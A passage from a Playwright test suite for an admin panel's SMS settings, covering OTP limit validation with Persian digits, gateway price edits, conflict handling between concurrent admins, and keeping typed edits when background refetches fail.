        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const soft = form.getByRole("textbox", {name: A("sms.limits.fields.otp_soft_pct.label")});
        for (const text of ["1.5", "-5", "۱٫۵"]) {
          await soft.fill(text);
          await soft.blur();
          // The text stays as typed (15 and 5 would be a different number), and the field says why.
          await expect(soft).toHaveValue(text);
          await expect(soft).toHaveAttribute("aria-invalid", "true");
          await expect(form.getByText(A("sms.limits.range", {min: lang === "fa" ? "۱" : 1, max: lang === "fa" ? "۱۰۰" : 100})).first()).toBeVisible();
          await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        }
        expect(mock.count("PUT /sms/limits")).toBe(0);
        // Digits of any numeral system are a number.
        await soft.fill("۷۵");
        await soft.blur();
        await expect(soft).not.toHaveAttribute("aria-invalid", "true");
        await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([{...limitsFixture(), otp_soft_pct: 75}]);
      });

      test("limits: a 422 field code has its own words, not 'It is not valid.' (wp10-r3-1)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "PUT /sms/limits": err(422, "validation_failed", {fields: [{name: "sms_cost_cap_daily", code: "price_required"}]}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const cap = form.getByRole("textbox", {name: A("sms.limits.fields.sms_cost_cap_daily.label")});
        await cap.fill("250000");
        await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        await expect.poll(() => mock.count("PUT /sms/limits")).toBe(1);
        // The value is valid: the words say what to do first, and the generic line is nowhere.
        await expect(form.getByText(adm(lang, "fieldErrors.price_required"))).toBeVisible();
        await expect(form.getByText(errText(lang, "fields.invalid"), {exact: true})).toHaveCount(0);
        await expect(cap).toHaveAttribute("aria-invalid", "true");
      });

      test("limits: the money cap reads the Persian decimal mark, and the server's four decimals are the same amount (wp10-r3-2, wp10-r3-3)", async ({page, context, baseURL}) => {
        // numeric(14,4) comes back as "250000.0000"; the admin typing 250000 has changed nothing.
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": {body: limitsFixture({sms_cost_cap_daily: "250000.0000"})}, "PUT /sms/limits": {body: limitsFixture({sms_cost_cap_daily: "12.5"})}, "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const cap = form.getByRole("textbox", {name: A("sms.limits.fields.sms_cost_cap_daily.label")});
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        await expect(cap).toHaveValue("250000.0000");
        await expect(save).toBeDisabled();
        await cap.fill("250000");
        await expect(save).toBeDisabled();
        await cap.fill("۱۲٫۵");
        await expect(cap).not.toHaveAttribute("aria-invalid", "true");
        await expect(save).toBeEnabled();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([{...limitsFixture(), sms_cost_cap_daily: "12.5"}]);
        // Saved: clean at once, whatever the server writes back.
        await expect(save).toBeDisabled();
      });

      test("limits: a limit the admin did not edit is what the server holds when they save (wp10-r4-3)", async ({page, context, baseURL}) => {
        // Admin A edits one limit and leaves the tab. Admin B sets a money cap and lowers the IP cap. When A's page reads the
        // server again, A's PUT (which replaces the whole object) must carry B's two values, not the ones A's page was seeded with.
        await page.clock.install();
        let server = limitsFixture();
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => ({body: server}), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const cooldown = form.locator('input[name="otp_cooldown_s"]');
        const ip = form.locator('input[name="otp_cap_ip"]');
        const cap = form.locator('input[name="sms_cost_cap_daily"]');
        await cooldown.fill("90");
        await cooldown.blur();
        await expect(ip).toHaveValue(digits(20));
        server = {...limitsFixture({otp_cap_ip: 7}), sms_cost_cap_daily: "250000.0000"};
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        // The untouched fields show the server's newest value, the edited one stays the admin's.
        await expect(ip).toHaveValue(digits(7));
        await expect(cap).toHaveValue("250000.0000");
        await expect(cooldown).toHaveValue(digits(90));
        await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([{...limitsFixture({otp_cap_ip: 7, otp_cooldown_s: 90}), sms_cost_cap_daily: "250000.0000"}]);
      });

      test("limits: a limit the admin edited and another admin changed too is a conflict that Save waits on (wp10-r5-3)", async ({page, context, baseURL}) => {
        // An SMS-pumping attack: A raised the IP cap and did not save; B lowered it to stop the pumping. A's PUT replaces the whole
        // object, so without an answer from A it would silently undo B's emergency limit, and both would see "Saved".
        await page.clock.install();
        let server = limitsFixture();
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => ({body: server}), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const ip = form.locator('input[name="otp_cap_ip"]');
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        const reconnect = async () => {
          await page.clock.fastForward(31_000);
          await page.evaluate(() => {
            window.dispatchEvent(new Event("offline"));
            window.dispatchEvent(new Event("online"));
          });
        };
        await ip.fill("60");
        await ip.blur();
        server = limitsFixture({otp_cap_ip: 10});
        await reconnect();
        // The field is still the admin's value, and the page says what the server holds now. Save waits, and Enter does not get around it.
        const note = form.getByTestId("conflict-otp_cap_ip");
        await expect(note).toBeVisible();
        await expect(note.getByTestId("conflict-otp_cap_ip-value")).toHaveText(digits(10));
        await expect(ip).toHaveValue(digits(60));
        await expect(save).toBeDisabled();
        await ip.press("Enter");
        expect(mock.count("PUT /sms/limits")).toBe(0);
        // A field that was not edited has no note.
        await expect(form.getByTestId("conflict-otp_cap_phone")).toHaveCount(0);
        // Keeping the admin's value is the deliberate answer: the note goes and the write carries it.
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await expect(note).toHaveCount(0);
        await expect(save).toBeEnabled();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([limitsFixture({otp_cap_ip: 60})]);
      });

      test("limits: the conflict note is an alert and reads a large value as the field does, without grouping (wp10-r20-2, wp10-r20-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let server = limitsFixture();
        await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => ({body: server}), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const global = form.locator('input[name="otp_cap_global"]');
        await global.fill("5000");
        await global.blur();
        server = limitsFixture({otp_cap_global: 10000});
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        const note = form.getByTestId("conflict-otp_cap_global");
        await expect(note).toBeVisible();
        // Announced on insertion: a polite status region that appears with its text is often not spoken.
        await expect(note).toHaveAttribute("role", "alert");
        // The note and the field it sits under show one number the same way: no thousands separator in either.
        await expect(note.getByTestId("conflict-otp_cap_global-value")).toHaveText(digits(10000));
        await note.getByRole("button", {name: A("conflict.useServer")}).click();
        await expect(global).toHaveValue(digits(10000));
      });

      test("limits: taking the server's value, or editing the field again, answers a conflict (wp10-r5-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let server = limitsFixture();
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => ({body: server}), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const ip = form.locator('input[name="otp_cap_ip"]');
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        const reconnect = async () => {
          await page.clock.fastForward(31_000);
          await page.evaluate(() => {
            window.dispatchEvent(new Event("offline"));
            window.dispatchEvent(new Event("online"));
          });
        };
        await ip.fill("60");
        await ip.blur();
        server = limitsFixture({otp_cap_ip: 10});
        await reconnect();
        const note = form.getByTestId("conflict-otp_cap_ip");
        await expect(note).toBeVisible();
        await note.getByRole("button", {name: A("conflict.useServer")}).click();
        await expect(note).toHaveCount(0);
        await expect(ip).toHaveValue(digits(10));
        await expect(save).toBeDisabled();
        // A second conflict, answered by typing in the field again.
        await ip.fill("40");
        await ip.blur();
        server = limitsFixture({otp_cap_ip: 5});
        await reconnect();
        await expect(note).toBeVisible();
        await expect(note.getByTestId("conflict-otp_cap_ip-value")).toHaveText(digits(5));
        await ip.fill("45");
        await ip.blur();
        await expect(note).toHaveCount(0);
        await expect(save).toBeEnabled();
        expect(mock.count("PUT /sms/limits")).toBe(0);
        // The server moving to what the admin typed is no conflict.
        await ip.fill("30");
        await ip.blur();
        server = limitsFixture({otp_cap_ip: 30});
        await reconnect();
        await expect(note).toHaveCount(0);
        await expect(form.getByTestId("conflict-otp_cap_phone")).toHaveCount(0);
      });

      test("gateways: the price reads the Persian decimal mark, and a refused price has its own words (wp10-r3-1, wp10-r3-2)", async ({page, context, baseURL}) => {
        let refuse = false;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "PUT /sms/gateways/{provider}": () => (refuse ? err(422, "validation_failed", {fields: [{name: "cost_per_message", code: "price_required"}]}) : {body: sms}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const price = dialog.locator('input[name="cost_per_message"]');
        refuse = true;
        await price.fill("");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(dialog.getByText(adm(lang, "fieldErrors.price_required"))).toBeVisible();
        await expect(dialog.getByText(errText(lang, "fields.invalid"), {exact: true})).toHaveCount(0);
        refuse = false;
        await price.fill("۰٫۵");
        await expect(price).not.toHaveAttribute("aria-invalid", "true");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/sms_ir")).toEqual([{cost_per_message: ""}, {cost_per_message: "0.5"}]);
      });

      // wp10-r8-3: the gateway price is a draft of a server value, and the daily money cap (the defence against SMS pumping) is counted
      // from it. The dialog used to be seeded from a copy of the row taken when it opened and wrote the price with no read at all.
      test("gateways: a price another admin set is read when Save is pressed, shown, and not written over (wp10-r8-3)", async ({page, context, baseURL}) => {
        let items = [sms, mela, none];
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => ({body: {items}}), "PUT /sms/gateways/{provider}": {body: sms}, "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const price = dialog.locator('input[name="cost_per_message"]');
        const save = dialog.getByRole("button", {name: A("sms.edit.submit")});
        await expect(price).toHaveValue("420");
        await price.fill("600");
        // Another admin sets the real tariff after this page loaded; nothing refetches on its own.
        items = [{...sms, cost_per_message: "1500.0000"}, mela, none];
        await save.click();
        await expect(page.getByText(A("conflict.refreshed"))).toBeVisible();
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(0);
        const note = dialog.getByTestId("conflict-cost_per_message");
        await expect(note).toBeVisible();
        await expect(dialog.getByTestId("conflict-cost_per_message-value")).toHaveText("1500.0000");
        await expect(price).toHaveValue("600");
        // Save waits for one deliberate answer, and Enter does not get around it.
        await expect(save).toBeDisabled();
        await price.press("Enter");
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(0);
        await note.getByRole("button", {name: A("conflict.keep")}).click();
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/sms_ir")).toEqual([{cost_per_message: "600"}]);
      });

      test("gateways: taking the server's price puts it in the field and sends nothing (wp10-r8-3)", async ({page, context, baseURL}) => {
        let items = [sms, mela, none];
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => ({body: {items}}), "PUT /sms/gateways/{provider}": {body: sms}},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const price = dialog.locator('input[name="cost_per_message"]');
        await price.fill("600");
        items = [{...sms, cost_per_message: "1500.0000"}, mela, none];
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await dialog.getByTestId("conflict-cost_per_message").getByRole("button", {name: A("conflict.useServer")}).click();
        await expect(price).toHaveValue("1500.0000");
        await expect(dialog.getByTestId("conflict-cost_per_message")).toHaveCount(0);
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(0);
      });

      // wp10-r9-4. The read before a write ran on the page's own query. When it failed (503 after its retries, which is common on an
      // unstable link) that query got an error, and the page swapped the open form for a section error: the edits were gone and the
      // form's own error with Retry never showed. The read now runs under a key of its own.
      test("limits: a read that fails at Save keeps the form and what was typed, shows Retry, and sends nothing (wp10-r9-4)", async ({page, context, baseURL}) => {
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => (up ? {body: limitsFixture()} : err(503, "service_unavailable")), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const cooldown = form.locator('input[name="otp_cooldown_s"]');
        const ip = form.locator('input[name="otp_cap_ip"]');
        await cooldown.fill("90");
        await ip.fill("12");
        await ip.blur();
        up = false;
        await form.getByRole("button", {name: A("sms.limits.submit")}).click();
        const retry = form.getByRole("button", {name: C("retry")});
        await expect(retry).toBeVisible({timeout: 15_000});
        // The form is still there with both edits, and the page did not turn into its section error.
        await expect(form).toBeVisible();
        await expect(cooldown).toHaveValue(digits(90));
        await expect(ip).toHaveValue(digits(12));
        expect(mock.count("PUT /sms/limits")).toBe(0);
        up = true;
        await retry.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([limitsFixture({otp_cooldown_s: 90, otp_cap_ip: 12})]);
      });

      test("gateways: a read that fails at Save keeps the dialog with the pasted key and the price, shows Retry, and sends nothing (wp10-r9-4)", async ({page, context, baseURL}) => {
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => (up ? {body: {items: [sms, mela, none]}} : err(503, "service_unavailable")), "PUT /sms/gateways/{provider}": {body: sms}, "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const price = dialog.locator('input[name="cost_per_message"]');
        const key = dialog.locator('input[name="gw_sms_ir_api_key"]');
        await price.fill("600");
        await key.fill("pasted-key-1234567890");
        up = false;
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        const retry = dialog.getByRole("button", {name: C("retry")});
        await expect(retry).toBeVisible({timeout: 15_000});
        await expect(dialog).toBeVisible();
        await expect(price).toHaveValue("600");
        await expect(key).toHaveValue("pasted-key-1234567890");
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(0);
        up = true;
        await retry.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/sms_ir")).toHaveLength(1);
        await expect(dialog).toHaveCount(0);
      });

      // wp10-r10-1. A background refetch of the page's query (the network came back, past the 30 s stale time) that fails keeps the old
      // data and sets `error`. The page parents used to show SectionError for that and unmounted the open form with its edits, and the
      // Edit credentials dialog with the pasted key. The page keeps what it has and says the refresh failed.
      test("limits: a failed background refetch keeps the form and what was typed, with a Retry line (wp10-r10-1)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => (up ? {body: limitsFixture()} : err(503, "service_unavailable")), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const cooldown = form.locator('input[name="otp_cooldown_s"]');
        const ip = form.locator('input[name="otp_cap_ip"]');
        await cooldown.fill("90");
        await ip.fill("12");
        await ip.blur();
        up = false;
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        await expect(page.getByTestId("refresh-failed")).toBeVisible({timeout: 20_000});
        // The line is announced (wp10-r11-2): it is inserted with its text, so it is an alert, as SectionError was before the line existed.
        await expect(page.getByRole("alert").filter({hasText: A("refreshFailed")})).toBeVisible();
        await expect(page.getByTestId("refresh-failed")).toHaveAttribute("role", "alert");
        await expect(page.getByTestId("sms-limits")).toBeVisible();
        await expect(cooldown).toHaveValue(digits(90));
        await expect(ip).toHaveValue(digits(12));
        // Retry answers, and the line goes while the edits stay.
        up = true;
        await page.getByTestId("refresh-failed").getByRole("button", {name: C("retry")}).click();
        await expect(page.getByTestId("refresh-failed")).toHaveCount(0);
        await expect(cooldown).toHaveValue(digits(90));
        expect(mock.count("PUT /sms/limits")).toBe(0);
      });

      test("gateways: a failed background refetch keeps the Edit credentials dialog and the pasted key (wp10-r10-1)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let up = true;
        await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => (up ? {body: {items: [sms, mela, none]}} : err(503, "service_unavailable")), "PUT /sms/gateways/{provider}": {body: sms}},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        const key = dialog.locator('input[name="gw_sms_ir_api_key"]');
        await key.fill("pasted-key-1234567890");
        up = false;
        await page.clock.fastForward(31_000);
        await page.evaluate(() => {
          window.dispatchEvent(new Event("offline"));
          window.dispatchEvent(new Event("online"));
        });
        await expect(page.getByTestId("refresh-failed")).toBeVisible({timeout: 20_000});
        await expect(dialog).toBeVisible();
        await expect(key).toHaveValue("pasted-key-1234567890");
      });

      // wp10-r11-3. The same failed background refetch for every other page that has a form under a query. Each case edits, fails the
      // reconnect refetch, and asserts that the form and the typed value stay, that the line is an alert, and that Retry clears it.
      test("routing: a failed background refetch keeps the chosen gateway and shows the line (wp10-r11-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/gateways": () => (up ? {body: {items: [sms, {...mela, role: "disabled"}]}} : err(503, "service_unavailable")), "PUT /sms/routing": {body: {items: [sms, {...mela, role: "fallback"}]}}, "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "routing").click();
        const form = page.getByTestId("sms-routing");
        await form.locator("button[aria-haspopup]").nth(1).click();
        await page.getByRole("option", {name: "Melipayamak"}).click();
        await expect(form.locator("button[aria-haspopup]").nth(1)).toContainText("Melipayamak");
        up = false;
        await reconnect(page);
        await expect(page.getByTestId("refresh-failed")).toBeVisible({timeout: 20_000});
        await expect(page.getByTestId("refresh-failed")).toHaveAttribute("role", "alert");
        await expect(form).toBeVisible();
        await expect(form.locator("button[aria-haspopup]").nth(1)).toContainText("Melipayamak");
        up = true;
        await page.getByTestId("refresh-failed").getByRole("button", {name: C("retry")}).click();
        await expect(page.getByTestId("refresh-failed")).toHaveCount(0);
        await expect(form.locator("button[aria-haspopup]").nth(1)).toContainText("Melipayamak");
        expect(mock.count("PUT /sms/routing")).toBe(0);
      });

      test("templates: a failed background refetch keeps the typed text, and one Retry asks again for both queries when both failed (wp10-r11-3)", async ({page, context, baseURL}) => {
        await page.clock.install();
        let up = true;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/templates": () => (up ? base["GET /sms/templates"] : err(503, "service_unavailable")),
            "GET /sms/gateways": () => (up ? base["GET /sms/gateways"] : err(503, "service_unavailable")),
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "templates").click();
        const card = page.getByTestId("template-otp-fa");
        await card.locator("textarea").fill("code is {code}");
        up = false;
        await reconnect(page);
        await expect(page.getByTestId("refresh-failed")).toBeVisible({timeout: 20_000});
        await expect(page.getByTestId("refresh-failed")).toHaveAttribute("role", "alert");
        await expect(card.locator("textarea")).toHaveValue("code is {code}");
        // Both reads are failing: one press must ask for both, or the line would need a second press that nothing says is needed.
        const before = {templates: mock.count("GET /sms/templates"), gateways: mock.count("GET /sms/gateways")};
        up = true;
        await page.getByTestId("refresh-failed").getByRole("button", {name: C("retry")}).click();
        await expect(page.getByTestId("refresh-failed")).toHaveCount(0);
        expect(mock.count("GET /sms/templates")).toBeGreaterThan(before.templates);
        expect(mock.count("GET /sms/gateways")).toBeGreaterThan(before.gateways);
        await expect(card.locator("textarea")).toHaveValue("code is {code}");
      });

      test("gateways: the price is read again after the fresh-code dialog, and one that moved meanwhile is not written over (wp10-r8-3)", async ({page, context, baseURL}) => {
        let items = [sms, mela, none];
        let puts = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/gateways": () => ({body: {items}}),
            "PUT /sms/gateways/{provider}": () => (++puts === 1 ? err(403, "totp_fresh_required") : {body: sms}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await dialog.locator('input[name="cost_per_message"]').fill("600");
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        // The attack starts and the real tariff is set while the admin looks for the phone.
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(1);
        items = [{...sms, cost_per_message: "1500.0000"}, mela, none];
        await typeCode(page, "totp_code", CODE);
        await expect(page.getByText(A("conflict.refreshed"))).toBeVisible();
        expect(mock.count("PUT /sms/gateways/{provider}")).toBe(1);
        await expect(dialog.getByTestId("conflict-cost_per_message-value")).toHaveText("1500.0000");
      });

      test("gateways: a credentials-only save reads nothing and sends no price (wp10-r8-3)", async ({page, context, baseURL}) => {
        const mock = await openAdmin(context, baseURL, {handlers: {...base, "PUT /sms/gateways/{provider}": {body: sms}}});
        await goto(page, "/sms", A("pages.sms.title"));
        await page.getByTestId("gateway-sms_ir").getByRole("button", {name: A("sms.gateways.edit")}).click();
        const dialog = page.getByRole("dialog", {name: A("sms.edit.title", {provider: "sms.ir"})});
        await dialog.locator('input[name="gw_sms_ir_api_key"]').fill("fixture-key-value");
        const before = mock.calls.length;
        await dialog.getByRole("button", {name: A("sms.edit.submit")}).click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/gateways/sms_ir")).toEqual([{credentials: {api_key: "fixture-key-value"}}]);
        // The write is the first call the click makes. The list is fetched again only after it, by the mutation's own invalidation.
        expect(mock.calls.slice(before).map((c) => `${c.method} ${c.path}`)[0]).toBe("PUT /sms/gateways/sms_ir");
        // The save has ended before the test does: while it runs the dialog holds typed credentials and the leave guard is armed, and a page
        // closed in that instant once outlasted the 10 s the guard gives it (the short check of 2026-11-24).
        await expect(dialog).toBeHidden();
      });

      // The conflict gate (wp10-r5-3) and the read before a write (wp10-r6-5) for every form that keeps a draft of a server value. Nothing
      // here refocuses, goes offline or moves the clock: the page stays open on a stable connection, which is when the queries do not
      // refetch, so the form must read the server itself when Save is pressed.

      test("limits: Save reads the server first, with no refocus or reconnect, and sends the newest value of every field the admin did not edit (wp10-r6-5)", async ({page, context, baseURL}) => {
        let server = limitsFixture();
        const mock = await openAdmin(context, baseURL, {
          handlers: {...base, "GET /sms/limits": () => ({body: server}), "PUT /sms/limits": (c) => ({body: c.body as ReturnType<typeof limitsFixture>}), "POST /auth/totp/fresh": FRESH},
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const cooldown = form.locator('input[name="otp_cooldown_s"]');
        const ip = form.locator('input[name="otp_cap_ip"]');
        const cap = form.locator('input[name="sms_cost_cap_daily"]');
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        await cooldown.fill("90");
        await cooldown.blur();
        // Another admin sets a money cap and lowers the IP cap. This page has not heard of it.
        server = {...limitsFixture({otp_cap_ip: 7}), sms_cost_cap_daily: "250000.0000"};
        await save.click();
        // Nothing is sent from a form that is out of date: it shows the server's values and says why.
        await expect(page.getByText(A("conflict.refreshed"))).toBeVisible();
        await expect(ip).toHaveValue(digits(7));
        await expect(cap).toHaveValue("250000.0000");
        await expect(cooldown).toHaveValue(digits(90));
        expect(mock.count("PUT /sms/limits")).toBe(0);
        // The second press is the deliberate one: the write carries the server's cap and IP cap with the admin's cooldown.
        await save.click();
        await expect.poll(() => bodies(mock, "PUT", "/sms/limits")).toEqual([{...limitsFixture({otp_cap_ip: 7, otp_cooldown_s: 90}), sms_cost_cap_daily: "250000.0000"}]);
      });

      // wp10-r7-5: the read has to be part of the call the fresh-code dialog repeats. The dialog has no timeout, so the admin can take
      // minutes to find the phone, and a read made only before the first try says nothing about the server after them.
      test("limits: the server is read again after the fresh-code dialog, and a value that moved meanwhile is not written over (wp10-r7-5)", async ({page, context, baseURL}) => {
        let server = limitsFixture();
        let puts = 0;
        const mock = await openAdmin(context, baseURL, {
          handlers: {
            ...base,
            "GET /sms/limits": () => ({body: server}),
            "PUT /sms/limits": (c) => (++puts === 1 ? err(403, "totp_fresh_required") : {body: c.body as ReturnType<typeof limitsFixture>}),
            "POST /auth/totp/fresh": FRESH,
          },
        });
        await goto(page, "/sms", A("pages.sms.title"));
        await tab(page, "limits").click();
        const form = page.getByTestId("sms-limits");
        const digits = (n: number) => (lang === "fa" ? String(n).replace(/[0-9]/g, (d) => "۰۱۲۳۴۵۶۷۸۹"[Number(d)]!) : String(n));
        const cooldown = form.locator('input[name="otp_cooldown_s"]');
        const ip = form.locator('input[name="otp_cap_ip"]');
        const cap = form.locator('input[name="sms_cost_cap_daily"]');
        const save = form.getByRole("button", {name: A("sms.limits.submit")});
        await cooldown.fill("90");
        await cooldown.blur();
        await save.click();
        await expect(page.getByRole("dialog", {name: A("fresh.title")})).toBeVisible();
        // The server still holds what this form saw, so the first read passed and the PUT was refused for the code. While the dialog is open
        // an SMS-pumping attack starts and another admin sets a money cap and lowers the IP cap.
        expect(mock.count("PUT /sms/limits")).toBe(1);
        server = {...limitsFixture({otp_cap_ip: 7}), sms_cost_cap_daily: "250000.0000"};
        await typeCode(page, "totp_code", CODE);
        await expect(page.getByText(A("conflict.refreshed"))).toBeVisible();
        // Nothing was repeated: the old body, with the old IP cap and no cap, never reaches the server again.
        expect(mock.count("PUT /sms/limits")).toBe(1);
        await expect(ip).toHaveValue(digits(7));
        await expect(cap).toHaveValue("250000.0000");
        await expect(cooldown).toHaveValue(digits(90));
        // The next Save is the deliberate act and carries the server's values.
        await save.click();
        await expect.poll(() => mock.count("PUT /sms/limits")).toBe(2);
        expect(bodies(mock, "PUT", "/sms/limits").at(-1)).toEqual({...limitsFixture({otp_cap_ip: 7, otp_cooldown_s: 90}), sms_cost_cap_daily: "250000.0000"});
      });

      // wp10-r7-2: the read before a write is part of the write, so the fields and the button show it. An edit typed while the read
      // is in flight used to be sent by nobody and then cleared by `saved()` as though it had been written.
